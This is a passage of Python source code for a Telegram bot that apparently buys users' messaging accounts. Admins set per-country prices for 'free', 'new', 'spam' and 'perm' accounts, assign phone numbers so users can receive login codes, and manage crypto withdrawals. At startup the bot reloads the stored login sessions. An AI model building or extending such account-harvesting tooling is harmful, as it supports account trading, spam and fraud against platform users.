        await q.edit_message_text(f"🪙 BEP20 Withdrawal is now **{status}**", parse_mode="Markdown")

    # ===== Bot ON / OFF =====
    elif data == "bot_on":
        settings = get_settings()
        settings["bot_on"] = True
        save_settings(settings)
        await q.edit_message_text("🟢 Bot is now **ON**")

    elif data == "bot_off":
        settings = get_settings()
        settings["bot_on"] = False
        save_settings(settings)
        await q.edit_message_text("🔴 Bot is now **OFF**")

    # ===== Set Min Withdraw & Ref Bonus =====
    elif data == "set_min_wd":
        context.user_data["edit"] = "min_withdraw"
        await q.edit_message_text("Send new Minimum Withdraw amount:\nExample: `1.5`", parse_mode="Markdown")

    elif data == "set_ref":
        context.user_data["edit"] = "ref_bonus"
        await q.edit_message_text("Send new Referral Bonus:\nExample: `0.05`", parse_mode="Markdown")

    # ===== Country List =====
    elif data == "country_list":
        countries = get_countries()
        if not countries:
            await q.edit_message_text("No countries added yet.")
            return
        text = "🌍 **Country List**\n\n"
        for code, info in list(countries.items())[:20]:
            flag = get_flag(code)
            name = info.get("name") or get_country_name(code)
            status = "✅" if info.get("enabled", True) else "❌"
            avail = get_available_capacity(code)
            text += f"{status} {flag} +{code} {name} | Cap: {avail}\n"
        kb = [[InlineKeyboardButton("◀️ Back", callback_data="dash_country")]]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    # ===== Add Country Start =====
    elif data == "country_add":
        context.user_data["add_country"] = {}
        await q.edit_message_text(
            "➕ **Add Country**\n\n"
            "Send Country Code or Country Name:\n"
            "Example: `880` or `Bangladesh`",
            parse_mode="Markdown"
        )
        return ADD_COUNTRY_NAME

    # ===== Remove / Enable / Disable Country =====
    elif data in ["country_remove", "country_enable", "country_disable"]:
        action = data.replace("country_", "")
        context.user_data["country_action"] = action
        await q.edit_message_text(
            f"Send the Country Code you want to **{action}**:\nExample: `880`",
            parse_mode="Markdown"
        )

    # ===== Change Price / Wait / Capacity =====
    elif data in ["country_price", "country_wait", "country_capacity"]:
        action = data.replace("country_", "")
        context.user_data["country_edit"] = action
        await q.edit_message_text(
            f"Send Country Code and new value.\n\n"
            f"Example for price:\n`880 0.30 0.35 0.25 0.40`\n"
            f"(code free new spam perm)\n\n"
            f"Example for wait:\n`880 18h` or `880 1080`\n\n"
            f"Example for capacity:\n`880 500`",
            parse_mode="Markdown"
        )

    # ===== Frozen Accounts =====
    elif data == "dash_frozen":
        frozen = load_json(FROZEN_FILE, {})
        if not frozen:
            text = "🧊 No frozen accounts."
        else:
            text = f"🧊 **Frozen Accounts ({len(frozen)})**\n\n"
            for i, (phone, info) in enumerate(list(frozen.items())[:20], 1):
                text += f"{i}. `{phone}` - {info.get('reason', 'Frozen')}\n"
        kb = [[InlineKeyboardButton("◀️ Back", callback_data="dash_home")]]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    # ===== Broadcast =====
    elif data == "dash_broadcast":
        kb = [
            [InlineKeyboardButton("👥 All Users", callback_data="bc_all")],
            [InlineKeyboardButton("👤 Custom User", callback_data="bc_custom")],
            [InlineKeyboardButton("◀️ Back", callback_data="dash_home")]
        ]
        await q.edit_message_text("📢 **Board Chat**\n\nSelect option:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "bc_all":
        context.user_data["broadcast"] = "all"
        await q.edit_message_text("Send the message you want to broadcast to **All Users**:")

    elif data == "bc_custom":
        context.user_data["broadcast"] = "custom"
        await q.edit_message_text("Send the User ID first:")
        # ====================== ADMIN TEXT HANDLER ======================
async def admin_edit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    uid = update.effective_user.id
    text = update.message.text.strip()

    # ===== Broadcast =====
    if "broadcast" in context.user_data:
        mode = context.user_data.pop("broadcast")
        if mode == "all":
            accounts = load_json(ACCOUNTS_FILE, {})
            user_ids = list(set(a.get("uid") for a in accounts.values() if a.get("uid")))
            success = failed = 0
            status = await update.message.reply_text(f"📢 Sending to {len(user_ids)} users...")
            for u in user_ids:
                try:
                    await context.bot.send_message(u, f"📢 **Announcement**\n\n{text}", parse_mode="Markdown")
                    success += 1
                except:
                    failed += 1
            await status.edit_text(f"✅ Done!\nSuccess: `{success}`\nFailed: `{failed}`", parse_mode="Markdown")
        elif mode == "custom":
            try:
                target = int(text)
                context.user_data["bc_target"] = target
                context.user_data["broadcast"] = "custom_msg"
                await update.message.reply_text(f"Now send the message for user `{target}`:")
            except:
                await update.message.reply_text("Invalid User ID")
        return

    if context.user_data.get("broadcast") == "custom_msg":
        target = context.user_data.pop("bc_target", None)
        context.user_data.pop("broadcast", None)
        if target:
            try:
                await context.bot.send_message(target, f"📢 **Message from Admin**\n\n{text}", parse_mode="Markdown")
                await update.message.reply_text("✅ Message sent!")
            except:
                await update.message.reply_text("❌ Failed to send.")
        return

    # ===== Settings Edit =====
    if "edit" in context.user_data:
        key = context.user_data.pop("edit")
        try:
            settings = get_settings()
            if key == "min_withdraw":
                settings["min_withdraw"] = float(text)
            elif key == "ref_bonus":
                settings["ref_bonus"] = float(text)
            save_settings(settings)
            await update.message.reply_text(f"✅ Updated **{key}** to `{text}`", parse_mode="Markdown")
        except:
            await update.message.reply_text("❌ Invalid value")
        return

    # ===== Country Action (remove / enable / disable) =====
    if "country_action" in context.user_data:
        action = context.user_data.pop("country_action")
        code = text.replace("+", "").strip()
        countries = get_countries()

        if code not in countries:
            await update.message.reply_text("❌ Country not found.")
            return

        if action == "remove":
            del countries[code]
            save_countries(countries)
            await update.message.reply_text(f"✅ Country `+{code}` removed.")
        elif action == "enable":
            countries[code]["enabled"] = True
            save_countries(countries)
            await update.message.reply_text(f"✅ Country `+{code}` enabled.")
        elif action == "disable":
            countries[code]["enabled"] = False
            save_countries(countries)
            await update.message.reply_text(f"🔴 Country `+{code}` disabled.")
        return

    # ===== Country Edit (price / wait / capacity) =====
    if "country_edit" in context.user_data:
        edit_type = context.user_data.pop("country_edit")
        parts = text.split()
        if len(parts) < 2:
            await update.message.reply_text("❌ Invalid format.")
            return

        code = parts[0].replace("+", "")
        countries = get_countries()
        if code not in countries:
            await update.message.reply_text("❌ Country not found. Add it first.")
            return

        try:
            if edit_type == "price":
                if len(parts) >= 5:
                    countries[code]["free"] = float(parts[1])
                    countries[code]["new"] = float(parts[2])
                    countries[code]["spam"] = float(parts[3])
                    countries[code]["perm"] = float(parts[4])
                else:
                    countries[code]["free"] = float(parts[1])
                    countries[code]["new"] = float(parts[1])
                    countries[code]["spam"] = float(parts[1])
                    countries[code]["perm"] = float(parts[1])
                save_countries(countries)
                await update.message.reply_text(f"✅ Price updated for `+{code}`")
            elif edit_type == "wait":
                minutes = parse_wait_time(" ".join(parts[1:]))
                countries[code]["wait"] = minutes
                save_countries(countries)
                await update.message.reply_text(f"✅ Wait time updated for `+{code}` → {format_wait_time(minutes)}")
            elif edit_type == "capacity":
                countries[code]["capacity"] = int(parts[1])
                save_countries(countries)
                await update.message.reply_text(f"✅ Capacity updated for `+{code}` → `{parts[1]}`")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
        return
        # ====================== ADD COUNTRY CONVERSATION ======================
async def add_country_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    code = text.replace("+", "")

    # Try to detect code from name
    if not code.isdigit():
        for c, name in COUNTRY_NAMES.items():
            if text.lower() in name.lower() or name.lower() in text.lower():
                code = c
                break
        else:
            await update.message.reply_text("❌ Could not detect country. Please send country code (e.g. 880)")
            return ADD_COUNTRY_NAME

    context.user_data["add_country"] = {
        "code": code,
        "name": get_country_name(code)
    }

    await update.message.reply_text(
        f"Country detected: **{get_flag(code)} {get_country_name(code)} (+{code})**\n\n"
        f"Now send **Free Price**:\nExample: `0.30`",
        parse_mode="Markdown"
    )
    return ADD_COUNTRY_FREE


async def add_country_free(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        price = float(update.message.text.strip())
        context.user_data["add_country"]["free"] = price
        await update.message.reply_text("Send **New Price**:\nExample: `0.35`")
        return ADD_COUNTRY_NEW
    except:
        await update.message.reply_text("❌ Invalid price. Send a number.")
        return ADD_COUNTRY_FREE


async def add_country_new(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        price = float(update.message.text.strip())
        context.user_data["add_country"]["new"] = price
        await update.message.reply_text("Send **Spam Price**:\nExample: `0.25`")
        return ADD_COUNTRY_SPAM
    except:
        await update.message.reply_text("❌ Invalid price.")
        return ADD_COUNTRY_NEW


async def add_country_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        price = float(update.message.text.strip())
        context.user_data["add_country"]["spam"] = price
        await update.message.reply_text("Send **Perm Price**:\nExample: `0.40`")
        return ADD_COUNTRY_PERM
    except:
        await update.message.reply_text("❌ Invalid price.")
        return ADD_COUNTRY_SPAM


async def add_country_perm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        price = float(update.message.text.strip())
        context.user_data["add_country"]["perm"] = price
        await update.message.reply_text("Send **Capacity** (how many accounts allowed):\nExample: `500`")
        return ADD_COUNTRY_CAPACITY
    except:
        await update.message.reply_text("❌ Invalid price.")
        return ADD_COUNTRY_PERM


async def add_country_capacity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        cap = int(update.message.text.strip())
        context.user_data["add_country"]["capacity"] = cap
        await update.message.reply_text(
            "Send **Wait Time**:\nExample: `18h` or `1h 30m` or `1080`"
        )
        return ADD_COUNTRY_WAIT
    except:
        await update.message.reply_text("❌ Invalid number.")
        return ADD_COUNTRY_CAPACITY


async def add_country_wait(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        minutes = parse_wait_time(update.message.text.strip())
        data = context.user_data.get("add_country", {})
        code = data.get("code")

        countries = get_countries()
        countries[code] = {
            "name": data.get("name"),
            "free": data.get("free", 0.30),
            "new": data.get("new", 0.30),
            "spam": data.get("spam", 0.30),
            "perm": data.get("perm", 0.30),
            "capacity": data.get("capacity", 0),
            "wait": minutes,
            "enabled": True
        }
        save_countries(countries)

        flag = get_flag(code)
        text = (
            f"✅ **Country Added Successfully!**\n\n"
            f"{flag} **+{code} {data.get('name')}**\n\n"
            f"🆓 Free: `${data.get('free')}`\n"
            f"🆕 New: `${data.get('new')}`\n"
            f"🚫 Spam: `${data.get('spam')}`\n"
            f"🔒 Perm: `${data.get('perm')}`\n"
            f"👤 Capacity: `{data.get('capacity')}`\n"
            f"⏳ Wait Time: `{format_wait_time(minutes)}`"
        )
        await update.message.reply_text(text, parse_mode="Markdown")

        # Optional: Notify all users about new country
        # (পরে চাইলে চালু করা যাবে)

        context.user_data.pop("add_country", None)
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        return ADD_COUNTRY_WAIT
        # ====================== SUPPORT SYSTEM ======================
async def support_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🧑🏻‍💻 Send your message.\n\n"
        "Type your problem or question.\n"
        "❌ /cancel to cancel"
    )
    return SUPPORT_MSG


async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text

    for admin_id in get_admins():
        try:
            kb = [[InlineKeyboardButton("💬 Reply", callback_data=f"reply_{user.id}")]]
            await context.bot.send_message(
                admin_id,
                f"🆘 **New Support Message**\n\n"
                f"From: {user.first_name} (`{user.id}`)\n"
                f"Username: @{user.username or 'None'}\n\n"
                f"{text}",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode="Markdown"
            )
        except:
            pass

    await update.message.reply_text("✅ Your message has been sent to support.")
    return ConversationHandler.END


# ====================== BACK NUMBER SYSTEM ======================
async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    await update.message.reply_text(
        "🔄 **Back Number System**\n\n"
        "Send the phone numbers (one per line or comma separated).\n"
        "Example:\n`+8801712345678`\n`+8801812345678`"
    )
    return BACK_NUMBERS


async def back_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    numbers = []
    for line in text.replace(",", "\n").splitlines():
        num = line.strip().replace(" ", "")
        if re.match(r'^\+?\d{8,15}$', num):
            if not num.startswith("+"):
                num = "+" + num
            numbers.append(num)

    if not numbers:
        await update.message.reply_text("❌ No valid numbers found.")
        return BACK_NUMBERS

    context.user_data["back_numbers"] = numbers
    await update.message.reply_text(
        f"✅ Got **{len(numbers)}** numbers.\n\n"
        f"Now send the **User ID** to assign these numbers:"
    )
    return BACK_USERID


async def back_userid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        target_uid = int(update.message.text.strip())
    except:
        await update.message.reply_text("❌ Invalid User ID")
        return BACK_USERID

    numbers = context.user_data.get("back_numbers", [])
    accounts = load_json(ACCOUNTS_FILE, {})
    added = 0

    for phone in numbers:
        code = get_country_code(phone)
        country = get_country(code) or {}
        price = float(country.get("free", 0.30))
        wait = int(country.get("wait", 1080))

        accounts[phone] = {
            "uid": target_uid,
            "name": "",
            "country": code,
            "price": price,
            "wait": wait,
            "claim_id": f"back_{target_uid}_{phone[1:]}_{int(datetime.now().timestamp())}",
            "status": "pending",
            "created": datetime.now().isoformat()
        }
        added += 1

    save_json(ACCOUNTS_FILE, accounts)
    context.user_data.pop("back_numbers", None)

    # Notify user
    try:
        await context.bot.send_message(
            target_uid,
            f"🔄 **Numbers Assigned to You**\n\n"
            f"Total Numbers: `{added}`\n"
            f"You will receive login codes here when they arrive."
        )
    except:
        pass

    await update.message.reply_text(f"✅ Successfully assigned **{added}** numbers to user `{target_uid}`")
    return ConversationHandler.END


# ====================== POST INIT & MAIN ======================
async def post_init(app: Application):
    print("🔄 Loading sessions...")
    accounts = load_json(ACCOUNTS_FILE, {})
    loaded = 0
    for phone in accounts:
        try:
            if await start_client(phone):
                loaded += 1
        except:
            pass
    print(f"✅ Bot Ready! Loaded {loaded} sessions.")
def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Login Conversation
    login_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)
        ],
        states={
            WAITING_CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Withdraw Conversation
    wd_conv = ConversationHandler(
        entry_points=[CommandHandler("withdraw", withdraw)],
        states={
            WD_METHOD: [CallbackQueryHandler(wd_method)],
            WD_DETAILS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, wd_details)
            ],
            WD_CONFIRM: [CallbackQueryHandler(wd_confirm)]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    # Support Conversation
    support_conv = ConversationHandler(
        entry_points=[CommandHandler("support", support_start)],
        states={
            SUPPORT_MSG: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    # Add Country Conversation
    add_country_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(admin_cb, pattern=r"^country_add$")
        ],
        states={
            ADD_COUNTRY_NAME: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, add_country_name)
            ],
            ADD_COUNTRY_FREE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, add_country_free)
            ],
            ADD_COUNTRY_NEW: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, add_country_new)
            ],
            ADD_COUNTRY_SPAM: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, add_country_spam)
            ],
            ADD_COUNTRY_PERM: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, add_country_perm)
            ],
            ADD_COUNTRY_CAPACITY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, add_country_capacity)
            ],
            ADD_COUNTRY_WAIT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, add_country_wait)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    # Back Number Conversation
    back_conv = ConversationHandler(
        entry_points=[CommandHandler("back", back_start)],
        states={
            BACK_NUMBERS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, back_numbers)
            ],
            BACK_USERID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, back_userid)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    # Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("caf", caf_cmd))
    app.add_handler(CommandHandler("balance", balance_cmd))
    app.add_handler(CommandHandler("myaccounts", myaccounts_cmd))
    app.add_handler(CommandHandler("dashboard", dashboard))
    app.add_handler(CommandHandler("cancel", cancel))

    app.add_handler(login_conv)
    app.add_handler(wd_conv)
    app.add_handler(support_conv)
    app.add_handler(add_country_conv)
    app.add_handler(back_conv)

    app.add_handler(
        CallbackQueryHandler(claim_cb, pattern=r"^claim_")
    )

    app.add_handler(
        CallbackQueryHandler(admin_cb)
    )

    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            admin_edit
        )
    )

    print("🚀 Bot is starting...")

    app.run_polling()


if __name__ == "__main__":
    main()
